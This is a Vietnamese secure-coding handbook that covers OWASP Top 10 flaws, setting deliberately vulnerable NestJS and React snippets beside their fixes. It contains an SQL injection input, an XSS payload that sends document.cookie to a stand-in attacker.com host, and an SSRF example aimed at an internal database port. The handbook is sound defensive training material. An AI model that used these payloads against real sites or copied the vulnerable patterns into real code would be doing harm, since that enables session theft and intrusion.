## **CẨM NANG BẢO MẬT ỨNG DỤNG**

_Phân tích OWASP Top 10 qua Minh họa Thực tế với NestJS và React_

**Giới thiệu kỹ thuật:** Tài liệu này cung cấp cái nhìn chi tiết về các lỗ hổng bảo mật phổ biến nhất theo danh mục **OWASP Top 10**. Mỗi lỗ hổng được phân tích toàn diện, bao gồm: cơ chế khai thác, lỗ hổng mã nguồn thực tế trong hệ sinh thái toàn màn hình (Backend: **NestJS / TypeORM**, Frontend: **React**) và giải pháp khắc phục triệt để theo chuẩn production.

---

## **A01:2021 - Kiểm Soát Truy Cập Bị Phá Vỡ (Broken Access Control)**

**Cơ chế khai thác:** Kẻ tấn công vượt qua các cơ chế kiểm tra quyền hạn để truy cập trái phép vào tài nguyên của người dùng khác (IDOR) hoặc thực hiện các chức năng của quản trị viên (Privilege Escalation). Ví dụ, thay đổi ID trong URL hoặc payload gửi lên API mà hệ thống backend không đối chiếu với Session/JWT của người dùng hiện tại.

### **1. Backend (NestJS) - Lỗ hổng IDOR**

Dưới đây là mã nguồn endpoint lấy thông tin đơn hàng bị lỗi IDOR do tin tưởng hoàn toàn vào tham số `id` do client gửi lên mà không kiểm tra quyền sở hữu.

**Vulnerable NestJS Controller**

```typescript
@Get(':id')
async getOrder(@Param('id') id: string, @Req() req: any) {
  // LỖ HỔNG: Chỉ tìm kiếm theo ID đơn hàng mà không xác minh đơn hàng đó có thuộc về req.user.id hay không
  return this.orderService.findById(id);
}
```

**Remediated NestJS với Guard và Check Quyền Sở Hữu**

```typescript
@Get(':id')
@UseGuards(JwtAuthGuard)
async getOrder(@Param('id') id: string, @Req() req: any) {
  const order = await this.orderService.findById(id);
  if (!order) throw new NotFoundException('Order not found');
  
  // KHẮC PHỤC: Xác thực quyền sở hữu tài nguyên dữ liệu trước khi trả về
  if (order.userId !== req.user.id && req.user.role !== Role.ADMIN) {
    throw new ForbiddenException('Bạn không có quyền truy cập đơn hàng này');
  }
  return order;
}
```

---

## **A03:2021 - Lỗi Tiêm Mã (Injection) & XSS**

**Cơ chế khai thác:** Xảy ra khi dữ liệu không đáng tin cậy được gửi đến trình thông dịch dưới dạng một phần của lệnh hoặc truy vấn (SQL Injection, NoSQL Injection, XSS). Kẻ tấn công chèn các ký tự đặc biệt để thay đổi cấu trúc truy vấn nguyên bản nhằm đọc/ghi database trái phép hoặc thực thi script độc hại trên trình duyệt người dùng.

### **1. Backend (NestJS + TypeORM) - SQL Injection**

Sử dụng nối chuỗi thô trong truy vấn SQL thay vì tận dụng cơ chế Parameterized Query của ORM.

**Vulnerable Raw Query Injection**

```typescript
@Get('search')
async searchProducts(@Query('name') name: string) {
  // LỖ HỔNG: Nối chuỗi trực tiếp đầu vào từ user vào câu lệnh SQL thô
  return this.productRepository.query(
    `SELECT * FROM product WHERE name = '${name}'`
  );
}
// Kẻ tấn công truyền: name = "' OR '1'='1" -> Lấy toàn bộ sản phẩm
```

**Remediated Parameterized Query**

```typescript
@Get('search')
async searchProducts(@Query('name') name: string) {
  // KHẮC PHỤC: Sử dụng QueryBuilder hoặc tham số hóa ràng buộc bảo mật (Data Binding)
  return this.productRepository
    .createQueryBuilder('product')
    .where('product.name = :name', { name })
    .getMany();
}
```

### **2. Frontend (React) - Cross-Site Scripting (XSS)**

Mặc dù React tự động mã hóa chuỗi để chống XSS, việc lạm dụng thuộc tính render thô sẽ phá vỡ lớp bảo vệ này.

**Vulnerable React Render HTML Thô**

```jsx
function ProductReview({ comment }) {
  // LỖ HỔNG: Sử dụng dangerouslySetInnerHTML cho phép thực thi mã JavaScript độc hại từ dữ liệu user
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
}
// Payload khai thác: <img src="x" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)"/>
```

**Remediated React Tự Động Escape & Khử Khuẩn**

```jsx
import dompurify from 'dompurify';

function ProductReview({ comment }) {
  // KHẮC PHỤC 1: Render dạng Text chuẩn nếu không cần định dạng HTML
  // return <div>{comment}</div>;

  // KHẮC PHỤC 2: Nếu bắt buộc nhận HTML, sử dụng thư viện DOMPurify để loại bỏ script độc hại
  const cleanHtml = dompurify.sanitize(comment);
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

---

## **A04:2021 - Thiết Kế Không An Toàn (Insecure Design)**

**Cơ chế khai thác:** Đây là các lỗi thuộc về kiến trúc hệ thống và quy trình logic nghiệp vụ ngay từ khâu thiết kế (không phải do cài đặt code sai). Ví dụ: hệ thống lấy lại mật khẩu không có cơ chế giới hạn tần suất thử (Rate Limiting), cho phép kẻ tấn công vét cạn (Brute Force) OTP.

### **1. Backend (NestJS) - Thiết kế thiếu Rate Limiting**

Dưới đây là mã nguồn minh họa lỗi thiết kế thiếu kiểm soát tần suất yêu cầu nhạy cảm và giải pháp tích hợp tầng phòng thủ giới hạn tần suất gọi API để bảo vệ tài nguyên hệ thống.

**Vulnerable NestJS Controller (Thiếu Rate Limiting)**

```typescript
@Post('send-otp')
async sendOtp(@Body('phone') phone: string) {
  // LỖ HỔNG: Không giới hạn số lần gửi yêu cầu, dễ bị tấn công spam OTP / tốn chi phí SMS / brute-force
  return this.otpService.sendTo(phone);
}
```

**Remediated Cấu hình Throttler trong NestJS**

```typescript
import { ThrottlerModule, ThrottlerGuard } from '@nestjs/throttler';
import { Module } from '@nestjs/common';
import { APP_GUARD } from '@nestjs/core';

@Module({
  imports: [
    ThrottlerModule.forRoot([{
      ttl: 60000, // 1 phút
      limit: 5,   // Tối đa 5 request với các API nhạy cảm như Login/OTP
    }]),
  ],
  providers: [
    {
      provide: APP_GUARD,
      useClass: ThrottlerGuard,
    },
  ],
})
export class AppModule {}
```

---

## **A05:2021 - Cấu Hình Sai Sót Bảo Mật (Security Misconfiguration)**

**Cơ chế khai thác:** Xảy ra khi hệ thống bật các tính năng debug mặc định, cấu hình CORS quá lỏng lẻo (`Access-Control-Allow-Origin: *` kèm `Credentials`), hoặc để lộ các thông tin lỗi chi tiết (Stack Trace) ra môi trường Production giúp hacker thu thập thông tin hạ tầng.

### **1. Backend (NestJS) - Cấu hình CORS và Lộ thông tin Stack Trace**

**Vulnerable Mở CORS Vô Điều Kiện trong main.ts**

```typescript
const app = await NestFactory.create(AppModule);
// LỖ HỔNG: Cho phép mọi domain bên thứ ba đọc dữ liệu thông qua trình duyệt
app.enableCors({ origin: true, credentials: true });
```

**Remediated Khóa CORS nghiêm ngặt & Ẩn Exception Details**

```typescript
// 1. Khóa CORS chặt chẽ theo Whitelist cấu hình từ ENV
app.enableCors({
  origin: process.env.ALLOWED_ORIGINS.split(','),
  credentials: true,
});

// 2. Định nghĩa Toàn cục HttpExceptionFilter để ẩn Stack Trace ở Production
@Catch()
export class AllExceptionsFilter implements ExceptionFilter {
  catch(exception: unknown, host: ArgumentsHost) {
    const ctx = host.switchToHttp();
    const response = ctx.getResponse();
    const isProd = process.env.NODE_ENV === 'production';
    
    response.status(500).json({
      statusCode: 500,
      message: 'Internal server error',
      // KHẮC PHỤC: Không bao giờ trả về exception.stack cho client ở môi trường production
      error: isProd ? null : (exception as any).message,
    });
  }
}
```

---

## **A07:2021 - Sai Sót Xác Thực và Định Danh**

**Cơ chế khai thác:** Hệ thống sử dụng thuật toán mã hóa JWT yếu (ví dụ: cho phép thuật toán `none`), không thu hồi JWT cũ khi đăng xuất, hoặc lưu trữ Access Token lỏng lẻo ở phía Frontend khiến token dễ dàng bị đánh cắp qua XSS.

### **1. Frontend (React) - Lưu trữ Token không an toàn**

Lưu JWT Token vào `localStorage` là đích nhắm hàng đầu của các cuộc tấn công XSS thành công.

**Vulnerable Lưu trữ Token vào LocalStorage**

```javascript
// LỖ HỔNG: Script độc hại chạy trên trang web có thể truy cập trực tiếp câu lệnh này để lấy trộm token
localStorage.setItem('accessToken', token);
```

**Remediated Giải pháp HttpOnly Cookie phối hợp Memory State**

Khắc phục bằng cách yêu cầu Backend trả về Access Token qua biến cục bộ ngắn hạn (State) và Refresh Token thông qua một `HttpOnly, Secure, SameSite=Strict` Cookie.

**Remediated Cấu hình Cookie phía Backend (NestJS)**

```typescript
@Post('login')
async login(@Res({ passthrough: true }) response: Response) {
  const tokens = await this.authService.issueTokens();
  
  // KHẮC PHỤC: Trình duyệt tự lưu trữ bảo mật, JS hoàn toàn không thể đọc được cookie này
  response.cookie('refreshToken', tokens.refreshToken, {
    httpOnly: true,
    secure: true, // Chỉ gửi qua HTTPS
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 ngày
  });
  return { accessToken: tokens.accessToken };
}
```

---

## **A10:2021 - Giả Mạo Yêu Cầu Từ Phía Máy Chủ (SSRF)**

**Cơ chế khai thác:** Xảy ra khi một ứng dụng web thực hiện một yêu cầu HTTP đến một URL do người dùng cung cấp mà không qua kiểm tra kiểm soát. Kẻ tấn công có thể ép máy chủ backend gửi request truy cập vào các dịch vụ nội bộ (như AWS metadata endpoint `169.254.169.254` hoặc database nội bộ mạng LAN).

### **1. Backend (NestJS) - Kiểm tra URL do người dùng truyền vào**

**Vulnerable Tải ảnh từ URL bất kỳ**

```typescript
@Post('fetch-avatar')
async fetchAvatar(@Body('url') url: string) {
  // LỖ HỔNG: Kẻ tấn công truyền url = "http://127.0.0.1:5432" để quét port database nội bộ
  const response = await this.httpService.axiosRef.get(url);
  return response.data;
}
```

**Remediated Áp dụng Whitelist Domain định sẵn**

```typescript
@Post('fetch-avatar')
async fetchAvatar(@Body('url') url: string) {
  const parsedUrl = new URL(url);
  const allowedDomains = ['images.unsplash.com', 'res.cloudinary.com'];
  
  // KHẮC PHỤC: Chỉ cho phép gọi ra ngoài các domain an toàn đã được cấu hình trước
  if (!allowedDomains.includes(parsedUrl.hostname)) {
    throw new BadRequestException('Domain không được phép tải tài nguyên');
  }
  const response = await this.httpService.axiosRef.get(url);
  return response.data;
}
```

---
Tài liệu hướng dẫn thực hành lập trình an toàn dành cho đội ngũ Kỹ sư NestJS & React - 2026
